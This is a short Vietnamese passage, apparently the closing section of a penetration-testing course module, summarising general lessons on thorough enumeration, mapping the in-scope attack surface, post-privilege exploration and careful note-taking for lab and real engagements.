Ở phần cuối của Module này, hãy nói về một số **key takeaways** của bài kiểm thử xâm nhập. Một trong những bài học quan trọng nhất của Module này (và của toàn bộ khóa học) là **luôn thực hiện enumeration một cách kỹ lưỡng**. Chúng ta không thể tấn công những gì mình đã bỏ sót, vì vậy cần đảm bảo luôn **lập bản đồ toàn bộ attack surface** của tất cả các máy và dịch vụ nằm trong phạm vi đánh giá.

Một takeaway quan trọng khác là **không bao giờ bỏ qua hoặc rút ngắn quá trình enumeration** chỉ để theo đuổi một chiến thắng nhanh. Làm như vậy có thể khiến chúng ta bỏ lỡ những thông tin then chốt, từ đó bỏ qua một **attack vector** tiềm năng hơn nhiều.

Tiếp theo, khi đã giành được **administrative privileges** trên một hệ thống mục tiêu, chúng ta **không nên lập tức chuyển sang máy tiếp theo**. Với các quyền này, chúng ta có thể kiểm tra những khu vực của hệ thống mà trước đó **không thể truy cập**.

Cuối cùng, hãy bàn về cách làm việc với **thông tin đã thu thập** như các kết quả enumeration. Điều cốt yếu là chúng ta phải học cách **kết hợp thông tin** được tìm thấy trên các hệ thống khác nhau và ở các giai đoạn khác nhau của bài kiểm thử xâm nhập. Có những thông tin được tìm thấy trên một máy mà tại thời điểm đó **chưa thể khai thác**, nhưng chỉ trở nên hữu ích ở các giai đoạn sau của quá trình đánh giá. Việc **ghi chú chi tiết** là điều thiết yếu để không đánh mất hoặc nhầm lẫn các thông tin đã thu thập.

Việc ghi nhớ và áp dụng các **key takeaways** này sẽ cực kỳ giá trị, không chỉ trong **Challenge Labs** mà còn trong các **đánh giá thực tế**.